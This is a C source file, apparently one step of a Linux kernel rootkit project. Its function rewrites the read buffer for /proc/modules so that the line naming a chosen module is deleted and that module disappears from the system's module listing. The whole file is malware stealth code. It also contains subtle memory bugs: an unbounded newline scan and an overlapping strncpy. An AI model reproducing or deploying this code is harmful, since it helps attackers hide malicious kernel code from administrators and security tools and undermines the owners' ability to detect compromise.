#include "step6.h"
#include <linux/string.h>

ssize_t step6_hide_module(char *read_block_id, char *read_path, char *read_buffer, size_t read_buffer_size,char *module_name_to_hide) {

    if (strcmp(read_block_id, "proc") != 0 || strcmp(read_path, "/modules") != 0)
        return -1;

    size_t module_name_len = strlen(module_name_to_hide);

    char *delete_from_ptr = NULL;
    int delete_length = -1;

    {
        char *current_ptr = read_buffer;
        char *row_start_ptr = current_ptr;
        const char *end_ptr = read_buffer + read_buffer_size;

        while (current_ptr < end_ptr) {
            // go to end of line
            while (*current_ptr != '\n') ++current_ptr;
            // skip \n
            ++current_ptr;

            int row_length = (int) (current_ptr - row_start_ptr);

            if (strncmp(row_start_ptr, module_name_to_hide, module_name_len) == 0) {
                delete_from_ptr = row_start_ptr;
                delete_length = row_length;
                break;
            }
            row_start_ptr = current_ptr;
        }
    }

    if (delete_from_ptr) {
        pr_info("HIDING module %s\n", KBUILD_MODNAME);
        int offset = (int) (delete_from_ptr - read_buffer);

        // if not at end copy to override the line to hide
        if (offset + delete_length != read_buffer_size) {
            char *copy_from_ptr = delete_from_ptr + delete_length;
            unsigned long left_to_copy = read_buffer_size - offset - delete_length;
            strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
        }
        return (ssize_t)(read_buffer_size - delete_length);
    }

    return -1;
}
